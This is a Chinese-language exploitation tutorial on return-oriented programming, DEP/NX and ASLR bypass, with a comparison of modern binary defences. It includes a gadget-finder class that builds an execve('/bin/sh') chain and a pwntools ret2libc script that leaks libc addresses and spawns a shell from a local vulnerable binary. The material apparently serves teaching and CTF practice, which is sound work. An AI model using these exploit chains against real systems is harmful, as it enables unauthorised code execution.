# 缓冲区溢出进阶：ROP 与绕过 DEP

## 概述

现代操作系统默认启用 DEP（数据执行保护，Windows）/NX（Linux）——栈不可执行。攻击者转而使用 ROP（Return-Oriented Programming）绕过 DEP，利用程序中已有的合法代码片段（gadget）构造攻击链。

---

## 1. DEP/NX 绕过原理

```
缓冲区溢出演变:

  传统:   shellcode 放在栈上 → 跳转到 shellcode
          → DEP 阻止栈执行 → FAIL

  ROP:   利用程序中已有的代码片段 (gadgets)
          → 每个 gadget 以 ret 结尾
          → 串连多个 gadget 形成逻辑
          → 所有代码在 .text 段（可执行）→ SUCCESS

  Ret2libc: 直接调用 libc 中的 system() 函数
  ROP Chain: 多段 gadgets 组合实现复杂逻辑
```

---

## 2. ROP Gadget 搜索

```python
# 自动化 ROP gadget 搜索

import subprocess
import re

class ROPGadgetFinder:
    def __init__(self, binary_path):
        self.binary = binary_path

    def find_gadgets(self, depth=5):
        """使用 ROPgadget 搜索 gadget"""
        result = subprocess.run(
            ['ROPgadget', '--binary', self.binary, '--depth', str(depth)],
            capture_output=True, text=True
        )

        gadgets = {}
        for line in result.stdout.split('\n'):
            # 格式: 0x0804867a : pop eax ; ret
            match = re.match(r'(0x[0-9a-f]+) : (.+)', line)
            if match:
                addr = int(match.group(1), 16)
                insns = match.group(2)
                gadgets[addr] = insns

        return gadgets

    def build_chain(self, gadgets, target_call, args):
        """
        构建 ROP 链
        例: 调用 execve("/bin/sh", NULL, NULL)
        """
        chain = []

        # x86_64 调用约定: rdi, rsi, rdx, rcx, r8, r9
        # 调用 execve → rax=59, rdi="/bin/sh", rsi=0, rdx=0

        # 1. pop rdi; ret → 设置第一参数
        pop_rdi = self.find_gadget_by_insns(gadgets, 'pop rdi ; ret')
        chain.append((pop_rdi, addr_of("/bin/sh")))

        # 2. pop rsi; ret → 设置第二参数
        pop_rsi = self.find_gadget_by_insns(gadgets, 'pop rsi ; ret')
        chain.append((pop_rsi, 0))

        # 3. pop rdx; ret → 设置第三参数
        pop_rdx = self.find_gadget_by_insns(gadgets, 'pop rdx ; ret')
        chain.append((pop_rdx, 0))

        # 4. pop rax; ret → 设置系统调用号
        pop_rax = self.find_gadget_by_insns(gadgets, 'pop rax ; ret')
        chain.append((pop_rax, 59))

        # 5. syscall
        syscall = self.find_gadget_by_insns(gadgets, 'syscall')
        chain.append((syscall, None))

        return chain

    def find_gadget_by_insns(self, gadgets, pattern):
        """在 gadget 列表中查找特定模式"""
        for addr, insns in gadgets.items():
            if pattern in insns:
                return addr
        raise ValueError(f"Gadget not found: {pattern}")

    def crash_analysis(self, crash_input):
        """分析崩溃时的寄存器状态"""
        pass
```

---

## 3. ASLR 绕过技术

```python
class ASLRBypass:
    """ASLR 绕过技术"""

    @staticmethod
    def ret2plt(binary):
        """Ret2PLT: 利用 PLT/GOT 固定地址"""
        # PLT 地址通常不受 ASLR 影响（PIE 禁用时）
        # 找到 system@plt 地址
        system_plt = 0x08048400  # 固定地址（PIE 禁用）
        return system_plt

    @staticmethod
    def ret2csu():
        """__libc_csu_init gadget 的通用利用"""
        # __libc_csu_init 包含通用 gadget:
        #   pop rbx; pop rbp; pop r12; pop r13; pop r14; pop r15; ret
        #   mov rdx, r14; mov rsi, r13; mov edi, r12d
        #   call [r15+rbx*8]
        pass

    @staticmethod
    def partial_overwrite():
        """利用部分地址覆写绕过 64 位 ASLR"""
        # 例: 在栈上覆写低 2 字节，保留高 6 字节
        # 利用 4KB 页内对齐：低 12 位不变
        pass

    @staticmethod
    def stack_pivot():
        """栈迁移"""
        # 利用: xchg eax, esp; ret
        # 将栈指针迁移到攻击者控制的可写内存
        pass
```

---

## 4. 防御技术对照

```yaml
现代二进制防护技术:

  DEP/NX (2004+):
    原理: 标记数据页为不可执行
    绕过: ROP/Ret2libc
    增强: ASLR

  ASLR (2005+):
    原理: 随机化地址空间布局
    绕过: 信息泄漏 + 固定地址利用
    增强: PIE (位置无关可执行文件)

  Stack Canary (StackGuard):
    原理: 函数返回前检查栈上的 canary 值
    绕过: 信息泄漏 / fork() 暴力 / 覆写函数指针
    增强: Reorder 局部变量

  CFI (Control Flow Integrity):
    原理: 验证控制流转移目标（间接调用/jmp/ret）
    实现: clang CFI / MS Control Flow Guard
    绕过: COOP/JOP/随机化绕过

  Shadow Stack:
    原理: 单独维护返回地址的副本
    实现: Intel CET (2020+)
    绕过: 目前已知的绕过极少
```

---

## 5. 典型 ROP 利用示例

```bash
# 利用 pwntools 构造 ROP 链
from pwn import *

# 连接目标
p = process('./vulnerable')

# 构建 ROP 链
elf = ELF('./vulnerable')
rop = ROP(elf)

# ret2libc: 泄漏 puts 地址 → 计算 libc 基址 → system("/bin/sh")
rop.call('puts', [elf.got['puts']])   # 泄漏 GOT 表
rop.call('main')                       # 返回 main 以便再次利用

# 发送 payload
payload = b'A' * 112                  # 填充到返回地址
payload += rop.chain()
p.sendline(payload)

# 接收泄漏的地址
p.recvuntil(b'\n')
leaked_puts = u32(p.recv(4).ljust(4, b'\x00'))

# 计算 libc 基址
libc = ELF('/lib/i386-linux-gnu/libc.so.6')
libc.address = leaked_puts - libc.symbols['puts']

# 第二轮: 获取 shell
rop2 = ROP(libc)
rop2.call('system', [next(libc.search(b'/bin/sh'))])

payload2 = b'A' * 112 + rop2.chain()
p.sendline(payload2)
p.interactive()
```

---

## 参考资源

- [ROPgadget Tool](https://github.com/JonathanSalwan/ROPgadget)
- [pwntools](https://github.com/Gallopsled/pwntools)
- [CTF Wiki: ROP](https://ctf-wiki.org/pwn/linux/stackoverflow/rop/)

---

*上一篇：[权限提升](02-privilege-escalation.md)*

*下一篇：[Linux 持久化与权限维持](04-linux-persistence.md)*
